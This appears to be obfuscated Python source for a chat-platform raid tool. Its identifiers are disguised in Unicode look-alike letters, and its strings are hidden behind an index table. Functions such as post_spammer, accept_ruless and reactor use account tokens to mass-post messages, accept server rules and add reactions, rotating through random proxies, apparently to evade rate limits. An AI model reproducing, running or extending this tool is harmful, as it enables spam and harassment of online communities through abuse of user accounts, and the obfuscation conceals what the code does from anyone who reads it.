    𝗽𝘢𝙮𝘭𝗼𝙖𝙙 = {𝙄𝙉𝘐𝘕𝗹𝗹𝙄𝘔𝘐𝗜𝘭𝘔𝗹𝙡𝘐𝙡𝘭𝗡𝗡𝗜𝙡𝙡𝙈𝙉𝘭𝙉𝙡𝗠𝙄𝘔𝗜𝙈[153]: 𝗻𝘢𝙢𝗲, 𝙄𝗡𝘐𝗡𝘭𝗹𝘐𝙈𝘐𝗜𝗹𝙈𝘭𝘭𝘐𝗹𝘭𝗡𝘕𝙄𝙡𝗹𝘔𝗡𝗹𝗡𝘭𝙈𝗜𝘔𝘐𝙈[305]: 11, 𝙄𝘕𝙄𝗡𝙡𝗹𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝙡𝘐𝗹𝘭𝙉𝘕𝗜𝗹𝗹𝙈𝗡𝙡𝙉𝗹𝙈𝗜𝗠𝙄𝘔[306]: 4320, 𝘐𝗡𝗜𝙉𝙡𝗹𝗜𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝗜𝙡𝗹𝗡𝗡𝗜𝗹𝗹𝗠𝗡𝙡𝗡𝙡𝗠𝘐𝘔𝗜𝗠[307]: 𝘐𝗡𝗜𝘕𝗹𝙡𝗜𝗠𝙄𝙄𝘭𝘔𝘭𝗹𝘐𝗹𝙡𝘕𝙉𝙄𝙡𝘭𝗠𝗡𝙡𝘕𝙡𝗠𝗜𝙈𝗜𝙈[308]}
    𝙙𝘯 = 𝙩𝗼𝙠𝙚𝗻.split(𝗜𝙉𝗜𝙉𝙡𝙡𝗜𝘔𝙄𝘐𝗹𝙈𝙡𝘭𝙄𝗹𝘭𝘕𝘕𝙄𝘭𝙡𝗠𝙉𝗹𝙉𝗹𝘔𝘐𝘔𝙄𝗠[247])
    𝘯𝗻 = 𝘥𝗻[0]
    for _ in 𝗿𝗮𝗻𝗴𝘦(1):
        if 𝙥𝘳𝗼𝙭𝘺:
            𝙧𝘳 = 𝗿𝙚𝙦𝙪𝗲𝘀𝘁𝙨.post(f'{𝙄𝙉𝙄𝙉𝙡𝙡𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝘭𝙄𝗹𝗹𝗡𝘕𝙄𝘭𝙡𝙈𝙉𝘭𝘕𝗹𝘔𝙄𝙈𝗜𝗠[266]}{𝘤𝘩𝗮𝗻𝙣𝘦𝘭}{𝙄𝘕𝗜𝙉𝙡𝘭𝘐𝘔𝙄𝗜𝙡𝗠𝙡𝗹𝙄𝙡𝙡𝙉𝙉𝘐𝙡𝙡𝘔𝗡𝙡𝙉𝘭𝘔𝗜𝘔𝘐𝘔[309]}', headers=𝙝𝙚𝙖𝙙𝙚𝙧𝘀, json=𝘱𝗮𝙮𝘭𝙤𝘢𝙙, proxy={𝘐𝙉𝙄𝗡𝗹𝘭𝙄𝙈𝘐𝙄𝙡𝙈𝙡𝘭𝙄𝗹𝙡𝘕𝘕𝙄𝗹𝘭𝗠𝘕𝗹𝘕𝘭𝗠𝘐𝗠𝙄𝙈[244]: 𝙄𝙉𝘐𝘕𝙡𝙡𝘐𝘔𝘐𝙄𝘭𝙈𝙡𝗹𝘐𝙡𝗹𝘕𝗡𝙄𝘭𝙡𝙈𝗡𝘭𝗡𝘭𝗠𝗜𝗠𝗜𝗠[246] + 𝙧𝘢𝘯𝘥𝙤𝙢.choice(𝗽𝘳𝙤𝙭𝗶𝘦𝘀), 𝙄𝘕𝙄𝙉𝘭𝘭𝗜𝗠𝙄𝗜𝗹𝙈𝘭𝙡𝗜𝘭𝗹𝘕𝗡𝗜𝙡𝙡𝘔𝗡𝘭𝗡𝙡𝘔𝙄𝘔𝘐𝗠[245]: 𝙄𝗡𝙄𝗡𝘭𝗹𝘐𝙈𝙄𝗜𝗹𝙈𝗹𝘭𝘐𝗹𝗹𝗡𝗡𝘐𝘭𝙡𝗠𝙉𝙡𝘕𝘭𝘔𝗜𝙈𝘐𝙈[246] + 𝗿𝙖𝙣𝙙𝗼𝙢.choice(𝘱𝗿𝗼𝙭𝗶𝘦𝙨)})
        else:
            𝘳𝙧 = 𝘳𝗲𝗾𝘶𝙚𝘀𝘁𝘀.post(f'{𝙄𝙉𝙄𝙉𝙡𝙡𝘐𝙈𝙄𝙄𝗹𝗠𝗹𝗹𝗜𝗹𝗹𝘕𝘕𝘐𝘭𝗹𝙈𝗡𝙡𝘕𝙡𝙈𝗜𝘔𝙄𝗠[266]}{𝘤𝘩𝘢𝗻𝘯𝘦𝙡}{𝗜𝙉𝙄𝗡𝙡𝘭𝘐𝗠𝙄𝗜𝘭𝘔𝙡𝘭𝗜𝗹𝗹𝗡𝘕𝗜𝘭𝗹𝗠𝙉𝙡𝘕𝙡𝙈𝙄𝙈𝙄𝘔[309]}', headers=𝘩𝙚𝙖𝗱𝙚𝙧𝘀, json=𝘱𝗮𝘆𝗹𝗼𝙖𝘥)
    if 𝘳𝙧.status_code == 201:
        𝙥𝗿𝗶𝗻𝘵(f"{𝗿}{𝘐𝘕𝙄𝗡𝗹𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝙡𝘐𝘭𝗹𝘕𝘕𝙄𝙡𝗹𝘔𝙉𝘭𝘕𝘭𝙈𝘐𝘔𝗜𝘔[91]}{𝘥𝗮𝘁𝙚𝘵𝗶𝘮𝘦.datetime.now().strftime(f'{𝙜}{𝙄𝘕𝘐𝙉𝙡𝘭𝙄𝗠𝙄𝗜𝙡𝘔𝙡𝘭𝙄𝘭𝗹𝘕𝘕𝗜𝗹𝗹𝙈𝙉𝙡𝙉𝗹𝘔𝘐𝙈𝙄𝙈[92]}{𝙧}')}{𝘐𝙉𝗜𝙉𝗹𝙡𝘐𝘔𝙄𝗜𝘭𝘔𝙡𝘭𝙄𝗹𝗹𝙉𝘕𝙄𝘭𝙡𝗠𝘕𝘭𝙉𝙡𝗠𝗜𝗠𝗜𝘔[93]}{𝙧}{𝘐𝗡𝙄𝗡𝗹𝙡𝙄𝙈𝘐𝗜𝙡𝙈𝘭𝘭𝘐𝗹𝙡𝙉𝙉𝘐𝘭𝘭𝗠𝘕𝙡𝙉𝗹𝙈𝙄𝘔𝗜𝙈[91]}{𝗹𝙘}{𝙄𝙉𝗜𝙉𝙡𝘭𝙄𝘔𝘐𝘐𝘭𝗠𝙡𝗹𝗜𝗹𝘭𝘕𝘕𝗜𝗹𝘭𝘔𝙉𝙡𝗡𝙡𝘔𝘐𝘔𝙄𝗠[301]}{𝘳}{𝙄𝘕𝙄𝘕𝗹𝘭𝙄𝗠𝗜𝘐𝙡𝙈𝘭𝗹𝘐𝙡𝘭𝘕𝗡𝙄𝙡𝙡𝘔𝗡𝗹𝙉𝙡𝗠𝙄𝙈𝘐𝗠[93]}{𝘯𝘯}{𝘨}{𝙄𝘕𝗜𝘕𝗹𝙡𝙄𝘔𝘐𝙄𝗹𝙈𝘭𝘭𝘐𝙡𝘭𝘕𝗡𝘐𝗹𝗹𝗠𝙉𝘭𝗡𝘭𝗠𝘐𝘔𝙄𝙈[249]}")
    else:
        𝘱𝙧𝘪𝙣𝘁(f"{𝗿}{𝗜𝘕𝗜𝙉𝙡𝘭𝘐𝗠𝗜𝙄𝘭𝙈𝘭𝗹𝙄𝘭𝙡𝙉𝙉𝙄𝗹𝘭𝘔𝙉𝙡𝘕𝙡𝘔𝙄𝙈𝘐𝙈[91]}{𝙙𝗮𝙩𝗲𝙩𝘪𝗺𝙚.datetime.now().strftime(f'{𝗴}{𝗜𝙉𝗜𝘕𝘭𝗹𝗜𝘔𝙄𝘐𝙡𝘔𝗹𝘭𝙄𝙡𝗹𝙉𝘕𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝙡𝗠𝙄𝙈𝙄𝗠[92]}{𝘳}')}{𝘐𝗡𝘐𝗡𝘭𝙡𝙄𝗠𝗜𝗜𝘭𝗠𝘭𝗹𝙄𝙡𝘭𝗡𝗡𝙄𝗹𝗹𝗠𝗡𝗹𝙉𝗹𝙈𝘐𝙈𝗜𝗠[93]}{𝘳}{𝗜𝘕𝗜𝘕𝘭𝙡𝗜𝘔𝗜𝙄𝗹𝘔𝘭𝘭𝗜𝘭𝙡𝙉𝗡𝘐𝗹𝘭𝗠𝘕𝙡𝙉𝘭𝙈𝙄𝘔𝘐𝙈[91]}{𝙗}{𝘐𝙉𝘐𝗡𝗹𝘭𝙄𝘔𝙄𝙄𝙡𝘔𝗹𝗹𝙄𝗹𝘭𝙉𝘕𝙄𝘭𝗹𝘔𝗡𝙡𝙉𝙡𝗠𝙄𝙈𝙄𝘔[269]}{𝗿}{𝗜𝘕𝗜𝗡𝘭𝘭𝘐𝘔𝘐𝘐𝘭𝗠𝗹𝗹𝘐𝗹𝘭𝙉𝘕𝗜𝘭𝗹𝗠𝙉𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝙈[93]}{𝗻𝘯}{𝘨}{𝙄𝘕𝙄𝘕𝙡𝗹𝗜𝘔𝙄𝘐𝗹𝗠𝙡𝙡𝘐𝗹𝙡𝙉𝙉𝘐𝙡𝙡𝘔𝘕𝗹𝘕𝘭𝗠𝙄𝙈𝘐𝗠[270]}{𝘳𝘳.text}")

def post_spammer(token, channel, name, msg):
    𝘩𝘦𝙖𝘥𝙚𝗿𝘀 = 𝗛𝘦𝘢𝗱𝗲𝙧𝘀(𝘵𝗼𝘬𝘦𝗻)
    𝘥𝗻 = 𝙩𝘰𝘬𝘦𝗻.split(𝙄𝘕𝙄𝘕𝘭𝘭𝗜𝘔𝗜𝘐𝘭𝘔𝘭𝙡𝘐𝘭𝙡𝙉𝙉𝙄𝘭𝘭𝘔𝘕𝙡𝙉𝙡𝗠𝘐𝙈𝗜𝘔[247])
    𝙣𝘯 = 𝗱𝘯[0]
    𝙥𝘢𝙮𝘭𝙤𝘢𝙙 = {𝘐𝙉𝘐𝗡𝙡𝗹𝘐𝘔𝘐𝗜𝘭𝙈𝘭𝙡𝙄𝗹𝘭𝗡𝘕𝙄𝗹𝙡𝙈𝗡𝙡𝙉𝘭𝗠𝘐𝗠𝘐𝘔[153]: 𝘯𝘢𝘮𝗲, 𝗜𝙉𝙄𝗡𝘭𝙡𝘐𝗠𝙄𝗜𝗹𝙈𝗹𝙡𝙄𝗹𝗹𝗡𝘕𝘐𝘭𝙡𝙈𝙉𝘭𝙉𝗹𝙈𝗜𝙈𝗜𝗠[306]: 4320, 𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝙈𝘐𝙄𝙡𝘔𝗹𝘭𝘐𝙡𝙡𝘕𝗡𝙄𝗹𝗹𝗠𝙉𝘭𝗡𝘭𝙈𝗜𝗠𝘐𝗠[310]: [], 𝙄𝗡𝘐𝘕𝙡𝘭𝘐𝘔𝗜𝗜𝙡𝗠𝗹𝗹𝙄𝗹𝙡𝗡𝙉𝗜𝗹𝗹𝗠𝘕𝘭𝙉𝙡𝗠𝘐𝗠𝙄𝙈[148]: {𝘐𝗡𝗜𝙉𝙡𝗹𝘐𝘔𝘐𝗜𝗹𝗠𝗹𝙡𝘐𝘭𝙡𝗡𝘕𝘐𝗹𝗹𝘔𝘕𝗹𝙉𝙡𝗠𝙄𝗠𝗜𝙈[265]: 𝘮𝘀𝙜}}
    𝘴𝘭𝘦𝘦𝙥(1)
    if 𝙥𝘳𝗼𝘅𝘆:
        𝘳𝙧 = 𝙧𝘦𝗾𝙪𝗲𝘴𝙩𝙨.post(f'{𝘐𝙉𝘐𝘕𝘭𝘭𝙄𝙈𝙄𝗜𝘭𝙈𝘭𝙡𝙄𝗹𝙡𝘕𝗡𝗜𝘭𝘭𝗠𝘕𝗹𝗡𝘭𝙈𝙄𝘔𝘐𝙈[266]}{𝙘𝗵𝙖𝘯𝙣𝙚𝘭}{𝗜𝗡𝘐𝙉𝙡𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝙄𝗹𝙡𝘕𝙉𝙄𝘭𝙡𝘔𝗡𝘭𝙉𝙡𝘔𝗜𝙈𝙄𝗠[311]}', json=𝗽𝘢𝘆𝗹𝗼𝘢𝘥, headers=𝙝𝙚𝘢𝙙𝙚𝙧𝙨, proxy={𝘐𝘕𝗜𝘕𝗹𝙡𝘐𝘔𝙄𝙄𝙡𝙈𝙡𝗹𝙄𝘭𝙡𝙉𝙉𝙄𝗹𝙡𝘔𝘕𝘭𝙉𝗹𝘔𝗜𝗠𝗜𝙈[244]: 𝙄𝘕𝘐𝙉𝙡𝘭𝙄𝗠𝗜𝘐𝘭𝙈𝘭𝗹𝙄𝘭𝘭𝗡𝗡𝙄𝙡𝗹𝗠𝙉𝗹𝘕𝗹𝘔𝗜𝘔𝙄𝘔[246] + 𝘳𝘢𝙣𝙙𝘰𝙢.choice(𝘱𝗿𝘰𝘹𝙞𝗲𝙨), 𝘐𝗡𝙄𝘕𝙡𝙡𝘐𝙈𝗜𝗜𝘭𝘔𝗹𝙡𝙄𝙡𝗹𝙉𝗡𝘐𝗹𝘭𝘔𝙉𝘭𝘕𝗹𝗠𝘐𝗠𝙄𝙈[245]: 𝙄𝗡𝙄𝗡𝗹𝙡𝘐𝘔𝘐𝘐𝘭𝗠𝗹𝙡𝙄𝘭𝘭𝘕𝙉𝙄𝘭𝘭𝘔𝘕𝙡𝗡𝗹𝙈𝗜𝘔𝙄𝗠[246] + 𝘳𝙖𝘯𝗱𝗼𝘮.choice(𝙥𝙧𝘰𝙭𝗶𝙚𝘴)})
    else:
        𝗿𝙧 = 𝘳𝙚𝘲𝙪𝗲𝘀𝘁𝘴.post(f'{𝙄𝘕𝗜𝙉𝗹𝙡𝗜𝙈𝗜𝙄𝘭𝗠𝙡𝙡𝘐𝘭𝘭𝙉𝗡𝗜𝙡𝘭𝗠𝙉𝘭𝘕𝙡𝗠𝗜𝙈𝗜𝙈[266]}{𝙘𝗵𝗮𝗻𝗻𝗲𝗹}{𝘐𝗡𝘐𝘕𝙡𝗹𝙄𝘔𝘐𝗜𝘭𝗠𝘭𝙡𝙄𝘭𝙡𝗡𝙉𝗜𝗹𝗹𝘔𝘕𝙡𝘕𝙡𝘔𝙄𝘔𝙄𝙈[311]}', json=𝗽𝗮𝘆𝙡𝘰𝙖𝘥, headers=𝗵𝙚𝙖𝙙𝗲𝘳𝙨)
    if 𝙧𝘳.status_code == 201:
        𝘱𝗿𝙞𝘯𝘁(f"{𝙧}{𝙄𝗡𝙄𝘕𝘭𝘭𝘐𝘔𝘐𝙄𝗹𝙈𝘭𝗹𝗜𝙡𝗹𝘕𝗡𝗜𝘭𝗹𝙈𝙉𝘭𝗡𝙡𝗠𝗜𝙈𝙄𝙈[91]}{𝘥𝙖𝘵𝙚𝘵𝙞𝘮𝘦.datetime.now().strftime(f'{𝗴}{𝙄𝙉𝘐𝗡𝗹𝘭𝘐𝙈𝘐𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝘭𝙉𝗡𝙄𝘭𝗹𝙈𝙉𝘭𝗡𝘭𝘔𝙄𝗠𝙄𝗠[92]}{𝙧}')}{𝘐𝙉𝗜𝘕𝗹𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝙡𝗡𝗡𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝗹𝙈𝗜𝙈𝙄𝗠[93]}{𝘳}{𝘐𝗡𝗜𝘕𝗹𝙡𝗜𝘔𝘐𝘐𝗹𝘔𝙡𝘭𝗜𝘭𝙡𝙉𝘕𝗜𝗹𝙡𝗠𝗡𝘭𝗡𝗹𝙈𝗜𝙈𝗜𝗠[91]}{𝘭𝗰}{𝘐𝗡𝗜𝘕𝙡𝙡𝘐𝗠𝗜𝙄𝘭𝗠𝘭𝘭𝗜𝙡𝘭𝘕𝙉𝘐𝙡𝗹𝙈𝘕𝘭𝗡𝘭𝗠𝗜𝘔𝘐𝗠[301]}{𝗿}{𝘐𝙉𝙄𝘕𝗹𝘭𝘐𝗠𝙄𝘐𝘭𝗠𝙡𝗹𝙄𝗹𝗹𝗡𝘕𝙄𝙡𝙡𝗠𝗡𝘭𝘕𝘭𝗠𝘐𝗠𝘐𝗠[93]}{𝙣𝙣}{𝙜}{𝗜𝗡𝙄𝙉𝘭𝗹𝙄𝘔𝘐𝗜𝘭𝙈𝗹𝗹𝘐𝘭𝘭𝘕𝙉𝙄𝙡𝙡𝗠𝙉𝘭𝘕𝗹𝗠𝙄𝙈𝘐𝗠[249]}")
    else:
        𝙥𝘳𝗶𝗻𝘁(f"{𝙧}{𝘐𝗡𝘐𝙉𝗹𝗹𝘐𝗠𝘐𝗜𝙡𝗠𝙡𝘭𝙄𝘭𝙡𝘕𝗡𝗜𝙡𝙡𝘔𝘕𝗹𝙉𝙡𝗠𝗜𝗠𝘐𝗠[91]}{𝙙𝙖𝙩𝙚𝘁𝗶𝗺𝗲.datetime.now().strftime(f'{𝘨}{𝘐𝙉𝙄𝗡𝘭𝗹𝘐𝙈𝙄𝗜𝘭𝙈𝘭𝙡𝗜𝘭𝙡𝙉𝘕𝘐𝗹𝘭𝘔𝘕𝙡𝘕𝙡𝗠𝙄𝙈𝗜𝙈[92]}{𝗿}')}{𝙄𝙉𝘐𝗡𝙡𝙡𝗜𝙈𝙄𝗜𝙡𝙈𝗹𝙡𝘐𝗹𝙡𝗡𝙉𝙄𝗹𝙡𝘔𝗡𝘭𝗡𝗹𝙈𝘐𝙈𝘐𝘔[93]}{𝘳}{𝙄𝘕𝗜𝙉𝙡𝙡𝘐𝙈𝗜𝘐𝙡𝗠𝙡𝗹𝙄𝘭𝙡𝗡𝘕𝙄𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝙈𝗜𝘔𝗜𝘔[91]}{𝘣}{𝗜𝙉𝙄𝗡𝘭𝘭𝙄𝘔𝘐𝗜𝗹𝙈𝘭𝗹𝘐𝙡𝙡𝘕𝙉𝘐𝙡𝙡𝘔𝘕𝘭𝙉𝙡𝙈𝗜𝙈𝗜𝘔[269]}{𝙧}{𝗜𝗡𝘐𝙉𝙡𝘭𝘐𝗠𝘐𝗜𝙡𝘔𝙡𝘭𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝗹𝘔𝘕𝗹𝗡𝙡𝙈𝙄𝗠𝘐𝙈[93]}{𝙣𝗻}{𝙜}{𝘐𝘕𝘐𝘕𝗹𝘭𝗜𝙈𝘐𝙄𝙡𝘔𝘭𝘭𝘐𝗹𝙡𝗡𝘕𝙄𝗹𝗹𝙈𝘕𝗹𝗡𝙡𝙈𝗜𝗠𝘐𝘔[270]}{𝘳𝗿.text}")

def accept_ruless(token, guild):
    𝘥𝙣 = 𝘁𝘰𝗸𝙚𝘯.split(𝙄𝗡𝗜𝙉𝙡𝘭𝙄𝘔𝗜𝙄𝘭𝙈𝘭𝙡𝗜𝙡𝙡𝘕𝙉𝗜𝙡𝘭𝗠𝘕𝗹𝙉𝗹𝗠𝗜𝗠𝘐𝙈[247])
    𝗻𝙣 = 𝘥𝘯[0]
    𝙝𝘦𝙖𝘥𝘦𝙧𝘴 = 𝘏𝙚𝗮𝘥𝘦𝘳𝘴(𝙩𝘰𝗸𝗲𝘯)
    try:
        if 𝘱𝙧𝘰𝘅𝙮:
            𝗻𝘪𝙜 = 𝗿𝗲𝘲𝘂𝗲𝙨𝙩𝙨.get(f'{𝘐𝙉𝙄𝗡𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝗠𝙡𝙡𝘐𝙡𝙡𝘕𝙉𝙄𝗹𝘭𝙈𝗡𝙡𝗡𝘭𝘔𝗜𝘔𝙄𝘔[152]}{𝘨𝘂𝘪𝗹𝘥}{𝘐𝘕𝘐𝗡𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝙈𝙡𝙡𝘐𝙡𝘭𝙉𝗡𝘐𝗹𝘭𝘔𝘕𝙡𝘕𝘭𝘔𝙄𝘔𝘐𝘔[312]}', headers=𝗵𝘦𝙖𝙙𝙚𝗿𝙨, proxy={𝙄𝙉𝙄𝙉𝘭𝗹𝙄𝘔𝘐𝘐𝘭𝘔𝗹𝗹𝙄𝗹𝘭𝘕𝗡𝙄𝙡𝙡𝗠𝗡𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝙈[244]: 𝙄𝙉𝗜𝗡𝗹𝘭𝗜𝘔𝘐𝙄𝘭𝙈𝗹𝙡𝗜𝙡𝙡𝙉𝗡𝘐𝘭𝗹𝘔𝗡𝗹𝙉𝙡𝗠𝗜𝘔𝙄𝘔[246] + 𝗿𝗮𝘯𝙙𝘰𝗺.choice(𝗽𝙧𝙤𝘅𝗶𝙚𝘴), 𝗜𝙉𝗜𝗡𝘭𝙡𝗜𝙈𝗜𝙄𝗹𝘔𝙡𝙡𝙄𝘭𝙡𝗡𝗡𝘐𝘭𝘭𝗠𝘕𝗹𝙉𝙡𝗠𝘐𝙈𝘐𝗠[245]: 𝘐𝗡𝙄𝙉𝗹𝗹𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝗹𝘐𝗹𝙡𝙉𝗡𝘐𝘭𝗹𝗠𝙉𝙡𝗡𝗹𝙈𝙄𝙈𝗜𝘔[246] + 𝗿𝗮𝙣𝙙𝗼𝘮.choice(𝙥𝙧𝗼𝘅𝗶𝗲𝘀)}).json()
        else:
            𝗻𝙞𝘨 = 𝘳𝘦𝗾𝘂𝙚𝘴𝘁𝙨.get(f'{𝗜𝗡𝘐𝗡𝘭𝙡𝗜𝗠𝘐𝘐𝙡𝙈𝘭𝙡𝘐𝙡𝘭𝘕𝘕𝗜𝘭𝗹𝘔𝘕𝙡𝙉𝘭𝗠𝗜𝗠𝗜𝗠[152]}{𝘨𝙪𝘪𝘭𝙙}{𝙄𝗡𝗜𝗡𝗹𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝗹𝘭𝘐𝙡𝘭𝗡𝙉𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝘭𝗠𝙄𝘔𝙄𝗠[312]}', headers=𝘩𝗲𝘢𝘥𝙚𝙧𝘀).json()
        if 𝗽𝘳𝘰𝘹𝘺:
            𝗿𝗿 = 𝘳𝘦𝗾𝙪𝗲𝙨𝘵𝘀.put(f'{𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝘭𝘭𝙉𝘕𝗜𝙡𝘭𝘔𝗡𝙡𝙉𝘭𝗠𝘐𝗠𝘐𝘔[152]}{𝙜𝘶𝙞𝘭𝘥}{𝗜𝘕𝗜𝘕𝙡𝙡𝗜𝙈𝙄𝙄𝙡𝙈𝘭𝙡𝘐𝙡𝘭𝗡𝗡𝙄𝘭𝗹𝗠𝗡𝗹𝗡𝙡𝘔𝙄𝙈𝗜𝗠[313]}', headers=𝘩𝘦𝙖𝙙𝗲𝙧𝘀, json=𝘯𝗶𝗴, proxy={𝘐𝗡𝙄𝙉𝗹𝙡𝗜𝙈𝗜𝘐𝗹𝘔𝘭𝗹𝘐𝙡𝙡𝗡𝙉𝗜𝘭𝘭𝘔𝗡𝙡𝙉𝗹𝗠𝘐𝙈𝙄𝗠[244]: 𝙄𝙉𝘐𝙉𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝙈𝙡𝙡𝗜𝘭𝗹𝘕𝘕𝗜𝘭𝙡𝗠𝘕𝙡𝙉𝘭𝘔𝘐𝘔𝙄𝗠[246] + 𝙧𝘢𝗻𝙙𝘰𝗺.choice(𝘱𝘳𝗼𝘅𝙞𝗲𝘀), 𝙄𝙉𝘐𝗡𝙡𝙡𝘐𝙈𝙄𝗜𝗹𝗠𝘭𝗹𝘐𝗹𝗹𝗡𝙉𝗜𝗹𝘭𝙈𝗡𝘭𝘕𝙡𝘔𝙄𝗠𝗜𝙈[245]: 𝘐𝙉𝗜𝙉𝗹𝙡𝗜𝙈𝗜𝗜𝗹𝙈𝙡𝙡𝙄𝗹𝘭𝙉𝗡𝗜𝘭𝗹𝗠𝘕𝗹𝗡𝙡𝗠𝗜𝘔𝙄𝗠[246] + 𝘳𝗮𝙣𝗱𝙤𝗺.choice(𝘱𝙧𝙤𝘹𝘪𝙚𝙨)})
        else:
            𝘳𝗿 = 𝙧𝘦𝙦𝘶𝙚𝘴𝘁𝘴.put(f'{𝘐𝗡𝗜𝙉𝙡𝗹𝘐𝙈𝗜𝘐𝙡𝗠𝙡𝘭𝙄𝘭𝙡𝘕𝙉𝙄𝗹𝙡𝗠𝙉𝙡𝘕𝗹𝗠𝘐𝙈𝗜𝘔[152]}{𝘨𝙪𝘪𝘭𝙙}{𝗜𝗡𝗜𝙉𝗹𝙡𝙄𝘔𝙄𝙄𝙡𝘔𝘭𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝗹𝙡𝙈𝗡𝙡𝘕𝗹𝘔𝙄𝗠𝙄𝙈[313]}', headers=𝙝𝙚𝙖𝙙𝙚𝙧𝙨, json=𝘯𝙞𝗴)
    except:
        pass
    if 𝘳𝗿.status_code == 201:
        𝗽𝗿𝙞𝗻𝘵(f"{𝙧}{𝙄𝙉𝙄𝘕𝗹𝗹𝘐𝗠𝗜𝙄𝗹𝗠𝗹𝘭𝘐𝙡𝙡𝘕𝘕𝙄𝘭𝘭𝙈𝘕𝗹𝗡𝗹𝗠𝘐𝙈𝘐𝙈[91]}{𝘥𝙖𝘵𝘦𝙩𝘪𝘮𝗲.datetime.now().strftime(f'{𝘨}{𝘐𝘕𝗜𝘕𝘭𝗹𝙄𝗠𝗜𝙄𝘭𝗠𝘭𝗹𝗜𝘭𝘭𝗡𝙉𝙄𝘭𝗹𝙈𝗡𝘭𝙉𝙡𝘔𝘐𝗠𝗜𝙈[92]}{𝘳}')}{𝗜𝗡𝗜𝗡𝗹𝙡𝗜𝗠𝙄𝘐𝙡𝘔𝗹𝘭𝙄𝘭𝙡𝙉𝘕𝗜𝙡𝗹𝙈𝙉𝙡𝘕𝘭𝘔𝘐𝘔𝙄𝗠[93]}{𝙧}{𝗜𝗡𝗜𝘕𝘭𝙡𝙄𝘔𝗜𝘐𝗹𝙈𝙡𝗹𝘐𝘭𝗹𝙉𝘕𝙄𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝙈𝙄𝘔𝙄𝘔[91]}{𝙡𝘤}{𝘐𝗡𝘐𝗡𝗹𝗹𝙄𝙈𝙄𝘐𝙡𝙈𝘭𝘭𝘐𝙡𝗹𝙉𝙉𝘐𝘭𝗹𝙈𝙉𝗹𝗡𝗹𝙈𝙄𝘔𝘐𝙈[301]}{𝘳}{𝙄𝙉𝘐𝗡𝘭𝗹𝘐𝘔𝘐𝗜𝘭𝙈𝗹𝙡𝘐𝘭𝗹𝙉𝗡𝙄𝗹𝙡𝗠𝘕𝙡𝙉𝘭𝗠𝙄𝙈𝘐𝗠[93]}{𝘯𝘯}{𝗜𝙉𝘐𝗡𝙡𝙡𝘐𝘔𝗜𝘐𝗹𝘔𝘭𝗹𝘐𝙡𝙡𝙉𝙉𝘐𝘭𝗹𝘔𝗡𝗹𝙉𝗹𝙈𝗜𝗠𝗜𝗠[249]}{𝙜}")
    else:
        𝗽𝗿𝙞𝘯𝘵(f"{𝗿}{𝘐𝘕𝙄𝘕𝗹𝙡𝙄𝘔𝘐𝙄𝘭𝘔𝗹𝙡𝘐𝘭𝗹𝘕𝙉𝘐𝙡𝗹𝘔𝙉𝗹𝘕𝘭𝗠𝙄𝘔𝘐𝙈[91]}{𝘥𝗮𝘁𝗲𝘁𝘪𝙢𝙚.datetime.now().strftime(f'{𝘨}{𝗜𝗡𝘐𝗡𝙡𝘭𝙄𝗠𝙄𝘐𝗹𝙈𝘭𝘭𝗜𝙡𝙡𝘕𝘕𝙄𝙡𝙡𝗠𝗡𝙡𝘕𝘭𝗠𝘐𝘔𝗜𝗠[92]}{𝗿}')}{𝘐𝗡𝙄𝗡𝘭𝘭𝙄𝙈𝙄𝙄𝗹𝗠𝘭𝘭𝗜𝗹𝗹𝗡𝙉𝙄𝗹𝘭𝘔𝙉𝗹𝘕𝙡𝘔𝘐𝙈𝘐𝗠[93]}{𝗿}{𝗜𝙉𝘐𝙉𝙡𝘭𝘐𝙈𝗜𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝘭𝗡𝗡𝘐𝘭𝘭𝗠𝘕𝘭𝙉𝗹𝘔𝘐𝘔𝘐𝙈[91]}{𝙡𝗰}{𝗜𝘕𝗜𝙉𝘭𝙡𝘐𝗠𝙄𝙄𝗹𝗠𝘭𝘭𝗜𝗹𝘭𝘕𝘕𝗜𝘭𝘭𝘔𝗡𝗹𝗡𝙡𝗠𝗜𝗠𝗜𝘔[314]}{𝗿}{𝗜𝗡𝙄𝙉𝙡𝙡𝗜𝙈𝗜𝙄𝘭𝗠𝗹𝘭𝘐𝗹𝙡𝗡𝘕𝙄𝙡𝘭𝘔𝘕𝗹𝙉𝗹𝙈𝘐𝗠𝗜𝙈[93]}{𝗻𝗻}{𝙄𝙉𝙄𝘕𝙡𝗹𝗜𝙈𝙄𝙄𝗹𝙈𝗹𝘭𝘐𝘭𝘭𝙉𝗡𝙄𝗹𝗹𝗠𝘕𝙡𝗡𝘭𝙈𝘐𝗠𝗜𝘔[249]}{𝘨}{𝗿𝙧.text}")

def reactor(token, emoji, message_link):
    𝙝𝘦𝙖𝗱𝘦𝗿𝙨 = 𝘏𝘦𝘢𝙙𝗲𝘳𝘴(𝙩𝙤𝘬𝘦𝗻)
    𝙘𝘩𝙖𝙣𝙣𝙚𝘭_𝙞𝘥 = 𝘮𝗲𝙨𝘴𝙖𝘨𝙚_𝗹𝗶𝘯𝙠.split(𝗜𝘕𝗜𝘕𝗹𝘭𝗜𝘔𝘐𝙄𝙡𝘔𝙡𝘭𝗜𝗹𝙡𝘕𝘕𝘐𝗹𝗹𝗠𝘕𝙡𝙉𝗹𝙈𝙄𝗠𝗜𝙈[315])[5]
